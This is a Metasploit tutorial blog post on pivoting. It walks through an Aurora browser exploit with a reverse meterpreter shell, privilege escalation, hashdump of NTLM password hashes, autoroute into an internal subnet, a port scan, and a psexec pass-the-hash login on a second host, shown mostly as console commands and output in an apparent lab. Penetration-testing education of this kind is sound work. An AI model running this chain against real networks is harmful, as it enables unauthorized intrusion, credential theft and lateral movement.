---
draft: false
title: MSF Pivoting
linkTitle: MSF Pivoting
translationKey: msf-pivoting
weight: 310
date: 2017-06-05T13:33:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Pivoting is using a compromised system to attack other systems on the same network. This article explains how to use Metasploit Framework for pivoting.
url: /msf-pivoting/
featured_image: /images/metasploit.jpg
categories:
   - Metasploit Framework
tags:
   - cybersecurity
   - metasploit framework
---
## What is Pivoting?

Let's assume that you have opened a meterpreter shell session on a system. The system you are logged in to may not be a fully authorized computer on the network. Using this first logged in system as a springboard and accessing other computers on the same network is called **pivoting**. You may also come across another terminology called **beachhead** or **entry point**.

You have the chance to access servers or network systems that normally do not have direct access using pivoting. In the scenario we will examine below, we will try to reach another computer using the network connections of a computer that has opened the meterpreter shell. While doing this, we will benefit from the routing opportunity offered by meterpreter.

## 1. Let's Open a Shell on the Computer

Thanks to the `exploit/windows/browser/ms10_002_aurora` module used here, a session is opened on the computer of the company employee who clicked on a malicious link.

```bash
msf > use exploit/windows/browser/ms10_002_aurora
msf exploit(ms10_002_aurora) > show options

Module options:

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 SRVHOST 0.0.0.0 yes The local host to listen on.
 SRVPORT 8080 yes The local port to listen on.
 SSL false no Negotiate SSL for **incoming connections
 SSLVersion SSL3 no Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
 URIPATH no The URI to use for **this exploit (default is random)
Exploit target:

 Id Name
 -- ----
 0 automatic
msf exploit(ms10_002_aurora) > set URIPATH /
URIPATH => /
msf exploit(ms10_002_aurora) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(ms10_002_aurora) > set LHOST 192.168.1.101
LHOST => 192.168.1.101
msf exploit(ms10_002_aurora) > exploit -j
> Exploit running as background job.

> Started reverse handler on 192.168.1.101:4444
> Using URL: <a href="http://0.0.0.0:8080/">http://0.0.0.0:8080/</a>
> Local IP: <a href="http://192.168.1.101:8080/">http://192.168.1.101:8080/</a>
> Server started.
msf exploit(ms10_002_aurora) >
```

You can see the new session opened with the `sessions -l` command. In the list below, it is seen that a connection is established from our own IP address `LHOST: 192.168.1.101` to the other target computer `RHOST:192.168.1.201`.

```bash
msf exploit(ms10_002_aurora) >
> Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.201
> Sending stage (749056 bytes) to 192.168.1.201
> Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.201:8777) at Mon Dec 06 08:22:29 -0700 2010

msf exploit(ms10_002_aurora) > sessions -l

active sessions
**===============**

 Id Type Information Connection
 -- ---- ----------- ----------
 1 meterpreter x86/win32 XEN-XP-SP2-BARE\Administrator @ XEN-XP-SP2-BARE 192.168.1.101:4444 -> 192.168.1.201:8777

msf exploit(ms10_002_aurora) >
```

## 1.Computer Network Cards

Now let's enter this session and look at the network settings of the target computer with the `ipconfig` command.

```bash
msf exploit(ms10_002_aurora) > sessions -i 1
> Starting interaction with 1...

meterpreter > ipconfig

Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport
Hardware MAC: d2:d6:70:fa:de:65
IP Address: 10.1.13.3
Netmask: 255.255.255.0

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address: 127.0.0.1
Netmask: 255.0.0.0

Citrix XenServer PV Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC: c6:ce:4e:d9:c9:6e
IP Address: 192.168.1.201
Netmask: 255.255.255.0
meterpreter >
```

From the IP address of the computer we are logged in to, we understand that the network card we are connected to is the card named `Citrix XenServer PV Ethernet Adapter - Packet Scheduler Miniport`.

However, there are 2 more cards in the system named

`MS TCP Loopback interface` and

`Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport`

The interface named `MS TCP Loopback interface` is the communication tool used as `localhost` anyway.

So, let's focus on the other network configuration named `Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport`.

```bash
Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport
Hardware MAC: d2:d6:70:fa:de:65
IP Address : 10.1.13.3
Netmask : 255.255.255.0
```

As far as we understand from this information, the IP address of the card named `Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport` is `10.1.13.3`. Then we understand that IP addresses in the range of `10.1.13.1-255` are given to those connected to this network. In CIDR format, this is shown as `10.1.13.0/24`.

One of the possibilities provided by Meterpreter is the `autoroute` script code. Let's view the help about autoroute.

```bash
meterpreter > run autoroute -h
> Usage: run autoroute [-r] -s subnet -n netmask
>Examples:
> run autoroute -s 10.1.1.0 -n 255.255.255.0 # Add a route to 10.10.10.1/255.255.255.0
> run autoroute -s 10.10.10.1 # Netmask defaults to 255.255.255.0
> run autoroute -s 10.10.10.1/24 # CIDR notation is also okay
> run autoroute -p # Print active routing table
> run autoroute -d -s 10.10.10.1 # Deletes the 10.10.10.1/255.255.255.0 route
> Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
```

Now let's do automatic routing. For this we use the following command.

```bash
meterpreter > run autoroute -s 10.1.13.0/24
> Adding a route to 10.1.13.0/255.255.255.0...
[+] Added route to 10.1.13.0/255.255.255.0 via 192.168.1.201
> Use the -p option to list all active routes
```

Route is done. Let's check.

```bash
meterpreter > run autoroute -p

Active Routing Table
**=====================**

Subnet Netmask Gateway
------ ------- -------
10.1.13.0 255.255.255.0 Session 1

meterpreter >
```

## Connection to 2nd Computer

Let's obtain the hash information with the `getsystem` command on the first computer. We will try to connect to the 2nd computer using this hash information. Remember that computers on the network perform authorization checks with hash values. You can see the Metasploit Framework [Privilege Escalation](/msf-privilege-escalation/) article about this technique.

With the following commands, we obtain SYSTEM information with `getsystem`, we obtain hash information with `hashdump` and we send the session to the background with `CTRL+Z` keys.

```bash
meterpreter > getsystem
...got system (via technique 1).

meterpreter > run hashdump
> Obtaining the boot key...
> Calculating the hboot key using SYSKEY c2ec80f879c1b5dc8d2b64f1e2c37a45...
> Obtaining the user list and keys...
> Decrypting user keys...
> Dumping password hashes...
Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9a6ae26408b0629ddc621c90c897 b42d:07a59dbe14e2ea9c4792e2f189e2de3a:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:ebf9fa44b3204029db5a8a77f5350160:::
victim:1004:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
meterpreter >
Background session 1? [y/n]
msf exploit(ms10_002_aurora) >
```

## Scanning the 2nd Computer Network

Thanks to routing, we can now communicate with the 2nd computer network. Then let's scan this network and see if ports `139` and `445` are open. You can also scan all ports if you want. We will scan these two ports just to give an example. We will use the `auxiliary/scanner/portscan/tcp` module for this scan. Note that we set the RHOSTS variable in the module to `RHOSTS 10.1.13.0/24`.

```bash
msf exploit(ms10_002_aurora) > use auxiliary/scanner/portscan/tcp 
msf auxiliary(tcp) > show options

Module options:

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string for **capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout **in **milliseconds
   VERBOSE      false            no        Display verbose output

msf auxiliary(tcp) > set RHOSTS 10.1.13.0/24
RHOST => 10.1.13.0/24
msf auxiliary(tcp) > set PORTS 139,445
PORTS => 139,445
msf auxiliary(tcp) > set THREADS 50
THREADS => 50
msf auxiliary(tcp) > run

> 10.1.13.3:139 - TCP OPEN
> 10.1.13.3:445 - TCP OPEN
> 10.1.13.2:445 - TCP OPEN
> 10.1.13.2:139 - TCP OPEN
> Scanned 256 of 256 hosts (100% complete)
> Auxiliary module execution completed
msf auxiliary(tcp) >
```
As a result of the scan, we found 2 IP addresses as `10.1.13.2` and `10.1.13.3`. Since the `10.1.13.3` IP address already belongs to our first computer, we will focus on the `10.1.13.2` IP address.

## Let's Make a Connection

We know that port 445 is used for `samba` network sharing operations. If so, we can use the `exploit/windows/smb/psexec` module. When making the module settings, note that we entered the `Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d` hash values ​​obtained from the first computer.

```bash
msf auxiliary(tcp) > use exploit/windows/smb/psexec
msf exploit(psexec) > show options

Module options:

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOST yes The target address
 RPORT 445 yes Set the SMB service port
 SMBDomain WORKGROUP no The Windows domain to use for **authentication
 SMBPass no The password for the specified username
 SMBUser no The username to authenticate as
Exploit target:

 Id Name
 -- ----
 0 automatic
msf exploit(psexec) > set RHOST 10.1.13.2
RHOST => 10.1.13.2

msf exploit(psexec) > set SMBUser Administrator
SMBUser => Administrator

msf exploit(psexec) > set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
SMBPass => 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d

msf exploit(psexec) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp

msf exploit(psexec) > exploit

> Connecting to the server...
> Started bind handler
> Authenticating to 10.1.13.2:445|WORKGROUP as user 'Administrator'...
> Uploading payload...
> Created \qNuIKByV.exe...
>Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
> Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
> Obtaining a service manager handle...
> Creating a new service (UOtrbJMd - "MNYR")...
> Closing service handle...
> Opening service...
> Starting the service...
>Removing the service...
> Closing service handle...
> Deleting \qNuIKByV.exe...
> Sending stage (749056 bytes)
> Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444) at Mon Dec 06 08:56:42 -0700 2010

meterpreter >
```

As you can see, we have established a connection to the second computer. As you can see from the line `[*] Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444)` above, we established this connection by following the route `192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444`.

192.168.1.101: Our own computer

192.168.1.201: The computer used as the pivot

10.1.13.2: The second computer that is accessed.

Let's look at the `ipconfig` settings of the second computer.

```bash
meterpreter > ipconfig

Citrix XenServer PV Ethernet Adapter
Hardware MAC: 22:73:ff:12:11:4b
IP Address : 10.1.13.2
Netmask : 255.255.255.0

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address : 127.0.0.1
Netmask : 255.0.0.0
meterpreter >
```

As you can see, **pivoting** is a very powerful technique. After accessing any computer in a network, it helps you reach other systems in the network.
